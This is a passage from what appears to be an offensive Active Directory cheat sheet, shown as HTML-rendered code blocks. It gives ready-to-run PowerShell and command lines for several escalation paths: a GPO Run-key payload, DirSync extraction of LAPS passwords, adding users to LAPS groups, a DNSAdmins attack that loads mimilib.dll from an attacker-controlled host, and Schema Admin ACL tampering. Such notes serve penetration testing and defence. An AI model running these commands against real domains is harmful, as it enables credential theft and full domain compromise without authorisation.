GPO"</span> <span class="cm-operator">-</span><span class="cm-identifier">Context</span> <span class="cm-identifier">Computer</span> <span class="cm-operator">-</span><span class="cm-identifier">Action</span> <span class="cm-identifier">Create</span> <span class="cm-operator">-</span><span class="cm-identifier">Key</span> <span class="cm-string">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run"</span> <span class="cm-operator">-</span><span class="cm-identifier">ValueName</span> <span class="cm-string">"Updater"</span> <span class="cm-operator">-</span><span class="cm-identifier">Value</span> <span class="cm-string">"C:\Windows\System32\cmd.exe /C \\path\to\payload"</span> <span class="cm-operator">-</span><span class="cm-builtin">Type</span> <span class="cm-identifier">ExpandString</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 127px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-after-gpo-refresh-on">After GPO refresh on the OU's machines, when the machines will restart the payload will be executed</p>
<h4 id="bkmrk-on-the-domain%2Fforest">On the domain/forest</h4>
<h5 id="bkmrk-ds-replication-get-c">DS-Replication-Get-Changes + DS-Replication-Get-Changes-All</h5>
<p id="bkmrk-we-can-dcsync">We can <strong>DCSync</strong></p>
<h5 id="bkmrk-ds-replication-get-c-0">DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set</h5>
<p id="bkmrk-it-is-possible-to-re">It is possible to realize a <strong>DirSync</strong> attack, as presented <a href="https://simondotsh.com/infosec/2022/07/11/dirsync.html">here</a></p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 680px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 228px; min-width: 680.143px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Import-Module</span> <span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">DirSync</span><span class="cm-punctuation">.</span><span class="cm-identifier">psm1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Sync all the LAPS passwords in the domain</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Sync-LAPS</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Sync a specific LAPS password</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Sync-LAPS</span> <span class="cm-operator">-</span><span class="cm-identifier">LDAPFilter</span> <span class="cm-string">'(samaccountname=&lt;computer$&gt;)'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Sync confidential attributs</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Sync-Attributes</span> <span class="cm-operator">-</span><span class="cm-identifier">LDAPFilter</span> <span class="cm-string">'(samaccountname=user1)'</span> <span class="cm-operator">-</span><span class="cm-identifier">Attributes</span> <span class="cm-identifier">unixUserPassword</span><span class="cm-punctuation">,</span><span class="cm-identifier">description</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 228px;"></div><div class="CodeMirror-gutters" style="height: 278px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-account-operators">Account Operators</h3>
<p id="bkmrk-the-members-of-this-">The members of this group can add and modify all the non admin users and groups. Since <strong>LAPS ADM</strong> and <strong>LAPS READ</strong> are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password. They also can manage the <strong>Server Operators</strong> group members which can authenticate on the DC.</p>
<h4 id="bkmrk-add-user-to-laps-gro">Add user to LAPS groups</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 738px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 738.048px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Add-DomainGroupMember</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">'LAPS ADM'</span> <span class="cm-operator">-</span><span class="cm-identifier">Members</span> <span class="cm-string">'user1'</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$cred</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-string">"domain.local"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Add-DomainGroupMember</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">'LAPS READ'</span> <span class="cm-operator">-</span><span class="cm-identifier">Members</span> <span class="cm-string">'user1'</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$cred</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-string">"domain.local"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-read-laps-password">Read LAPS password</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 731px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 730.81px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainComputer</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">computername</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">ms-mcs-AdmPwd</span><span class="cm-punctuation">,</span><span class="cm-identifier">ComputerName</span><span class="cm-punctuation">,</span><span class="cm-identifier">ms-mcs-AdmPwdExpirationTime</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-dns-admin">DNS Admin</h3>
<ul id="bkmrk-it-is-possible-for-t"><li>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).</li>
<li>In case the DC also serves as DNS, this will provide us escalation to DA.</li>
<li>Need privileges to restart the DNS service.</li>
</ul><h4 id="bkmrk-configure-the-dll">Configure the DLL</h4>
<p id="bkmrk-needs-rsat-dns">Needs RSAT DNS</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 564px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 163px; min-width: 564.333px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With dnscmd.exe</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">dnscmd &lt;target&gt; /config /serverlevelplugindll \\&lt;attacker_IP&gt;\dll\mimilib.dll</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With DNSServer module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$dnsettings</span> <span class="cm-operator">=</span> Get-DnsServerSetting <span class="cm-attribute">-ComputerName</span> &lt;target&gt; <span class="cm-attribute">-Verbose</span> <span class="cm-attribute">-All</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">$dnsettings</span>.ServerLevelPluginDll <span class="cm-operator">=</span> <span class="cm-string">"\\&lt;attacker_IP&gt;\dll\mimilib.dll"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Set-DnsServerSetting <span class="cm-attribute">-InputObject</span> <span class="cm-def">$dnsettings</span> <span class="cm-attribute">-ComputerName</span> &lt;target&gt; <span class="cm-attribute">-Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 163px;"></div><div class="CodeMirror-gutters" style="height: 213px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-restart-dns">Restart DNS</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 173.476px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sc \\&lt;target&gt; stop dns</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sc \\&lt;target&gt; start dns</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 95px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-schema-admin">Schema Admin</h3>
<p id="bkmrk-these-group-members-">These group members can change the "<em>schema</em>" of the AD. It means they can change the ACLs on the objects that will be created <strong>IN THE FUTUR</strong>. If we modify the ALCs on the group object, only the futur group will be affected, not the ones that are already present.</p>
<h4 id="bkmrk-change-acls-on-the-g">Change ACLs on the groups</h4>
<p id="bkmrk-give-full-rights-to-">Give full rights to a user on the groups</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 3554px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 3553.67px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$creds</span> <span class="cm-operator">=</span> <span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">Management</span><span class="cm-punctuation">.</span><span class="cm-identifier">Automation</span><span class="cm-punctuation">.</span><span class="cm-identifier">PSCredential</span> <span class="cm-punctuation">(</span><span class="cm-string">"domain.local\user1"</span><span class="cm-punctuation">,</span> <span class="cm-punctuation">(</span><span class="cm-builtin">ConvertTo-SecureString</span> <span class="cm-string">"Password"</span> <span class="cm-operator">-</span><span class="cm-identifier">AsPlainText</span> <span class="cm-operator">-</span><span class="cm-identifier">Force</span><span class="cm-punctuation">));</span> <span class="cm-identifier">Set-ADObject</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">"CN=group,CN=Schema,CN=Configuration,DC=domain,DC=local"</span> <span class="cm-operator">-Replace</span> <span class="cm-punctuation">@{</span><span class="cm-identifier">defaultSecurityDescriptor</span> <span class="cm-operator">=</span> <span class="cm-string">'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-854239470-2015502385-3018109401-52104)'</span><span class="cm-punctuation">;}</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span> <span class="cm-operator">-</span><span class="cm-identifier">server</span> <span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$creds</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-when-a-new-group-is-">When a new group is created we can add any user to it with the user who has full rights</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 2786px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 2786.43px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$User</span> <span class="cm-operator">=</span> <span class="cm-identifier">Get-ADUser</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">"CN=user1,CN=Users,DC=domain,DC=local"</span><span class="cm-punctuation">;</span> <span class="cm-variable-2">$Group</span> <span class="cm-operator">=</span> <span class="cm-identifier">Get-ADGroup</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">"CN=new_admingroup,CN=Users,DC=domain,DC=local"</span><span class="cm-punctuation">;</span> <span class="cm-variable-2">$creds</span> <span class="cm-operator">=</span> <span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">Management</span><span class="cm-punctuation">.</span><span class="cm-identifier">Automation</span><span class="cm-punctuation">.</span><span class="cm-identifier">PSCredential</span> <span class="cm-punctuation">(</span><span class="cm-string">"domain.local\user1"</span><span class="cm-punctuation">,</span> <span class="cm-punctuation">(</span><span class="cm-builtin">ConvertTo-SecureString</span> <span class="cm-string">"Password"</span> <span class="cm-operator">-</span><span class="cm-identifier">AsPlainText</span> <span class="cm-operator">-</span><span class="cm-identifier">Force</span><span class="cm-punctuation">));</span> <span class="cm-identifier">Add-ADGroupMember</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-variable-2">$Group</span> <span class="cm-operator">-</span><span class="cm-identifier">Members</span> <span class="cm-variable-2">$User</span> <span class="cm-operator">-</span><span class="cm-identifier">Server</span> <span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$creds</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
